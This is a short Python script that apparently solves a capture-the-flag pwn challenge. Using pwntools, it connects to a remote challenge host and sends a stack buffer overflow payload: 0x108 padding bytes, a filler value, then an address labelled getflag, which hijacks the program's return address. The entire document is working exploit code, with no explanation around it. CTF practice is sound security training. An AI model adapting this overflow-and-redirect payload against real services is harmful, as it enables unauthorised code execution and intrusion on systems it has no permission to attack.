from pwn import *

r = remote('pwn1.0ops.sjtu.cn',10001)

rep = 0x108

# rep //= 4

getflag = 0x0804856B

print(r.recvline())

payload = b'A' * rep + p32(0xffffffff) + p32(getflag) + b'\n'

r.send(payload)

print(r.recvall())
rep += 4